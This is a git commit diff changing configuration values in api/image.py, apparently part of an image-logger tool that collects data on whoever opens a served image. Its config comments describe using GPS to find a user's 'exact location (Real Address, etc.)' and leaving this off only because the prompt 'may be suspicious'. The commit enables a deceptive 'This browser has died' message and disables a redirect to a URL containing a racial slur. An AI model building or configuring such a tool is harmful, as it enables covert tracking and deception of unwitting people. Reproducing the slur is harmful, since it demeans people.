ffb7d9222ea2b11539e073a0df39a1bee269399b
Laddervr <tyedyefloyd@icloud.com>
2025-02-01 12:03:16 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "This browser has died", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://niggafart.com/" # Link to the webpage to redirect to 
     },
 
